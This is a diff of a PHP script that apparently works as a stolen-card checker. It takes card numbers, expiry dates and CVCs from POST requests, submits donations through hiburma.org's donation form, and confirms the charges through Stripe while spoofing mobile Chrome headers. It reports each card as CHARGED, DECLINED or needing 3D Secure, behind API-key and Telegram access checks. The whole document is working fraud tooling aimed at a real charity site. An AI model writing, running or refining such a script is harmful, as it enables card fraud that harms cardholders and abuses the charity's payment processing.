@@ -7,39 +7,16 @@ session_start([
 ]);
 
 // Enable error logging
-ini_set('display_errors', 0); // Disable display of errors to prevent exposing sensitive info
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/../logs/error.log');
 
-// Set content type to JSON
-header('Content-Type: application/json');
-
-// Record start time
-$startTime = microtime(true);
-
 // Include API key validation
-$validkeyPath = __DIR__ . '/validkey.php';
-if (!file_exists($validkeyPath)) {
-    error_log("validkey.php not found at: $validkeyPath");
-    http_response_code(500);
-    echo json_encode([
-        'status' => 'ERROR',
-        'message' => 'Server configuration error: Missing validation file',
-        'time_taken' => number_format(microtime(true) - $startTime, 2) . ' seconds'
-    ]);
-    exit;
-}
-
-require_once $validkeyPath;
-$validation = validateApiKey();
+require_once __DIR__ . '/validkey.php';
+ $validation = validateApiKey();
 
 if (!$validation['valid']) {
-    http_response_code(401);
-    echo json_encode([
-        'status' => 'ERROR',
-        'message' => $validation['response']['message'] ?? 'Invalid or missing API key',
-        'time_taken' => number_format(microtime(true) - $startTime, 2) . ' seconds'
-    ]);
+    header('Content-Type: application/json');
+    echo json_encode($validation['response']);
     exit;
 }
 
@@ -48,59 +25,33 @@ if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated']
     if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
         error_log("Unauthorized access to stripegbp.php: Invalid session");
         http_response_code(401);
-        echo json_encode([
-            'status' => 'ERROR',
-            'message' => 'Unauthorized access',
-            'time_taken' => number_format(microtime(true) - $startTime, 2) . ' seconds'
-        ]);
+        echo json_encode(['status' => 'ERROR', 'message' => 'Unauthorized access']);
         exit;
     }
 }
 
+// Set content type to JSON
+header('Content-Type: application/json');
+
 // Get card details from POST request
-$cardNumber = $_POST['card']['number'] ?? '';
-$expMonth = $_POST['card']['exp_month'] ?? '';
-$expYear = $_POST['card']['exp_year'] ?? '';
-$cvc = $_POST['card']['cvc'] ?? '';
+ $cardNumber = $_POST['card']['number'] ?? '';
+ $expMonth = $_POST['card']['exp_month'] ?? '';
+ $expYear = $_POST['card']['exp_year'] ?? '';
+ $cvc = $_POST['card']['cvc'] ?? '';
 
 // Validate card details
 if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
-    echo json_encode([
-        'status' => 'DECLINED',
-        'message' => 'Missing or incomplete card details',
-        'time_taken' => number_format(microtime(true) - $startTime, 2) . ' seconds'
-    ]);
+    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card details']);
     exit;
 }
 
 // Format year to 4 digits if needed
 if (strlen($expYear) == 2) {
-    $expYear = (intval($expYear) < 50 ? '20' : '19') . $expYear;
-}
-
-// Validate card format
-if (!preg_match('/^\d{13,19}$/', $cardNumber) || !preg_match('/^\d{1,2}$/', $expMonth) || 
-    !preg_match('/^\d{4}$/', $expYear) || !preg_match('/^\d{3,4}$/', $cvc)) {
-    echo json_encode([
-        'status' => 'DECLINED',
-        'message' => 'Invalid card format',
-        'time_taken' => number_format(microtime(true) - $startTime, 2) . ' seconds'
-    ]);
-    exit;
+    $expYear = '20' . $expYear;
 }
 
 // Initialize cookie jar for session continuity
-$cookieJar = tempnam(sys_get_temp_dir(), 'stripegbp_cookies_');
-if ($cookieJar === false) {
-    error_log("Failed to create temporary cookie file");
-    http_response_code(500);
-    echo json_encode([
-        'status' => 'ERROR',
-        'message' => 'Server error: Unable to create cookie file',
-        'time_taken' => number_format(microtime(true) - $startTime, 2) . ' seconds'
-    ]);
-    exit;
-}
+ $cookieJar = tempnam(sys_get_temp_dir(), 'cookies');
 
 // Function to generate a random boundary string for multipart form data
 function generateBoundary() {
@@ -110,15 +61,6 @@ function generateBoundary() {
         $boundary .= $chars[rand(0, strlen($chars) - 1)];
     }
     return $boundary;
-}
-
-// Function to build cookie string (replacing http_build_cookies)
-function buildCookieString($cookies) {
-    $cookieParts = [];
-    foreach ($cookies as $name => $value) {
-        $cookieParts[] = "$name=$value";
-    }
-    return implode('; ', $cookieParts);
 }
 
 // Function to submit donation to hiburma.org and get clientSecret
@@ -162,19 +104,19 @@ function submitDonation($cookieJar) {
     ];
     
     $headers = [
-        'Accept: application/json',
-        'Accept-Language: en-US,en;q=0.9',
-        'Content-Type: multipart/form-data; boundary=' . $boundary,
-        'Origin: https://www.hiburma.org',
-        'Priority: u=1, i',
-        'Referer: https://www.hiburma.org/?givewp-route=donation-form-view&form-id=542&locale=en_GB',
-        'Sec-Ch-Ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-        'Sec-Ch-Ua-Mobile: ?1',
-        'Sec-Ch-Ua-Platform: "Android"',
-        'Sec-Fetch-Dest: empty',
-        'Sec-Fetch-Mode: cors',
-        'Sec-Fetch-Site: same-origin',
-        'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
+        'accept: application/json',
+        'accept-language: en-US,en;q=0.9',
+        'content-type: multipart/form-data; boundary=' . $boundary,
+        'origin: https://www.hiburma.org',
+        'priority: u=1, i',
+        'referer: https://www.hiburma.org/?givewp-route=donation-form-view&form-id=542&locale=en_GB',
+        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+        'sec-ch-ua-mobile: ?1',
+        'sec-ch-ua-platform: "Android"',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-origin',
+        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
     ];
     
     $params = [
@@ -188,24 +130,16 @@ function submitDonation($cookieJar) {
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
-    curl_setopt($ch, CURLOPT_COOKIE, buildCookieString($cookies));
+    curl_setopt($ch, CURLOPT_COOKIE, http_build_query($cookies));
     curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
     curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    
     $response = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $curlError = curl_error($ch);
-    $result = $response ? json_decode($response, true) : null;
-    
+    $result = json_decode($response, true);
     curl_close($ch);
-    
-    if ($curlError) {
-        error_log("cURL error in submitDonation: $curlError");
-        return ['response' => null, 'httpCode' => 0, 'cookieJar' => $cookieJar, 'error' => $curlError];
-    }
     
     return ['response' => $result, 'httpCode' => $httpCode, 'cookieJar' => $cookieJar];
 }
@@ -213,20 +147,20 @@ function submitDonation($cookieJar) {
 // Function to confirm payment with Stripe
 function confirmPayment($clientSecret, $paymentIntentId, $returnUrl, $cardNumber, $cvc, $expYear, $expMonth, $cookieJar) {
     $headers = [
-        'Accept: application/json',
-        'Accept-Encoding: gzip, deflate, br, zstd',
-        'Accept-Language: en-US,en;q=0.9',
-        'Content-Type: application/x-www-form-urlencoded',
-        'Origin: https://js.stripe.com',
-        'Priority: u=1, i',
-        'Referer: https://js.stripe.com/',
-        'Sec-Ch-Ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-        'Sec-Ch-Ua-Mobile: ?1',
-        'Sec-Ch-Ua-Platform: "Android"',
-        'Sec-Fetch-Dest: empty',
-        'Sec-Fetch-Mode: cors',
-        'Sec-Fetch-Site: same-site',
-        'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
+        'accept: application/json',
+        'accept-encoding: gzip, deflate, br, zstd',
+        'accept-language: en-US,en;q=0.9',
+        'content-type: application/x-www-form-urlencoded',
+        'origin: https://js.stripe.com',
+        'priority: u=1, i',
+        'referer: https://js.stripe.com/',
+        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+        'sec-ch-ua-mobile: ?1',
+        'sec-ch-ua-platform: "Android"',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-site',
+        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
     ];
     
     // Generate random IDs
@@ -238,7 +172,7 @@ function confirmPayment($clientSecret, $paymentIntentId, $returnUrl, $cardNumber
     
     // Strip query parameters from return_url
     $parsedUrl = parse_url($returnUrl);
-    $cleanReturnUrl = $parsedUrl['scheme'] . '://' . $parsedUrl['host'] . ($parsedUrl['path'] ?? '');
+    $cleanReturnUrl = $parsedUrl['scheme'] . '://' . $parsedUrl['host'] . $parsedUrl['path'];
     
     // Construct Stripe payment confirmation data
     $stripeData = http_build_query([
@@ -291,36 +225,29 @@ function confirmPayment($clientSecret, $paymentIntentId, $returnUrl, $cardNumber
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    
     $response = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $curlError = curl_error($ch);
-    $result = $response ? json_decode($response, true) : null;
-    
+    $result = json_decode($response, true);
     curl_close($ch);
-    
-    if ($curlError) {
-        error_log("cURL error in confirmPayment: $curlError");
-        return ['response' => null, 'httpCode' => 0, 'error' => $curlError];
-    }
     
     return ['response' => $result, 'httpCode' => $httpCode];
 }
 
+// Record start time
+ $startTime = microtime(true);
+
 // Submit donation to get clientSecret
-$donationResult = submitDonation($cookieJar);
-$cookieJar = $donationResult['cookieJar'];
-$donationResponse = $donationResult['response'];
-$httpCode = $donationResult['httpCode'];
+ $donationResult = submitDonation($cookieJar);
+ $cookieJar = $donationResult['cookieJar'];
+ $donationResponse = $donationResult['response'];
+ $httpCode = $donationResult['httpCode'];
 
-// Calculate time taken for initial response
-$timeTaken = number_format(microtime(true) - $startTime, 2);
-
-if ($donationResult['error'] || $httpCode != 200 || !isset($donationResponse['data']['clientSecret'])) {
-    $errorMsg = $donationResult['error'] ?? ($donationResponse['error']['message'] ?? 'Failed to get clientSecret');
+if ($httpCode != 200 || !isset($donationResponse['data']['clientSecret'])) {
+    $errorMsg = $donationResponse['error']['message'] ?? 'Failed to get clientSecret';
     error_log("Donation API call failed: $errorMsg");
     unlink($cookieJar);
-    http_response_code($httpCode == 0 ? 500 : $httpCode);
+    $endTime = microtime(true);
+    $timeTaken = number_format($endTime - $startTime, 2);
     echo json_encode([
         'status' => 'ERROR',
         'message' => $errorMsg,
@@ -329,50 +256,36 @@ if ($donationResult['error'] || $httpCode != 200 || !isset($donationResponse['da
     exit;
 }
 
-$clientSecret = $donationResponse['data']['clientSecret'];
-$returnUrl = $donationResponse['data']['returnUrl'];
-$paymentIntentId = explode('_secret_', $clientSecret)[0];
+ $clientSecret = $donationResponse['data']['clientSecret'];
+ $returnUrl = $donationResponse['data']['returnUrl'];
+ $paymentIntentId = explode('_secret_', $clientSecret)[0];
 
 // Confirm payment with Stripe
-$stripeResult = confirmPayment($clientSecret, $paymentIntentId, $returnUrl, $cardNumber, $cvc, $expYear, $expMonth, $cookieJar);
-$stripeResponse = $stripeResult['response'];
-$httpCode = $stripeResult['httpCode'];
+ $stripeResult = confirmPayment($clientSecret, $paymentIntentId, $returnUrl, $cardNumber, $cvc, $expYear, $expMonth, $cookieJar);
+ $stripeResponse = $stripeResult['response'];
+ $httpCode = $stripeResult['httpCode'];
 
-// Calculate total time taken
-$timeTaken = number_format(microtime(true) - $startTime, 2);
+// Calculate time taken
+ $endTime = microtime(true);
+ $timeTaken = number_format($endTime - $startTime, 2);
 
 // Clean up cookie file
-if (file_exists($cookieJar)) {
-    unlink($cookieJar);
-}
+unlink($cookieJar);
 
-if ($stripeResult['error'] || $httpCode != 200 || isset($stripeResponse['error'])) {
+if ($httpCode != 200 || isset($stripeResponse['error'])) {
     $errorCode = $stripeResponse['error']['code'] ?? 'unknown_error';
-    $errorMessage = $stripeResult['error'] ?? ($stripeResponse['error']['message'] ?? 'Unknown error');
-    
-    // Check for 3DS requirement
-    if ($errorCode === 'authentication_required' || 
-        (isset($stripeResponse['error']['type']) && $stripeResponse['error']['type'] === 'card_error' && 
-         strpos($errorMessage, '3D Secure') !== false)) {
-        echo json_encode([
-            'status' => '3DS',
-            'message' => '3D Secure authentication required',
-            'time_taken' => "$timeTaken seconds"
-        ]);
-    } else {
-        http_response_code($httpCode == 0 ? 500 : $httpCode);
-        echo json_encode([
-            'status' => 'DECLINED',
-            'message' => $errorMessage,
-            'time_taken' => "$timeTaken seconds"
-        ]);
-    }
+    $errorMessage = $stripeResponse['error']['message'] ?? 'Unknown error';
+    echo json_encode([
+        'status' => $errorCode,
+        'message' => $errorMessage,
+        'time_taken' => "$timeTaken seconds"
+    ]);
     exit;
 }
 
 // Success response
 echo json_encode([
-    'status' => 'CHARGED',
+    'status' => 'success',
     'message' => 'PAYMENT_SUCCESS',
     'time_taken' => "$timeTaken seconds"
 ]);
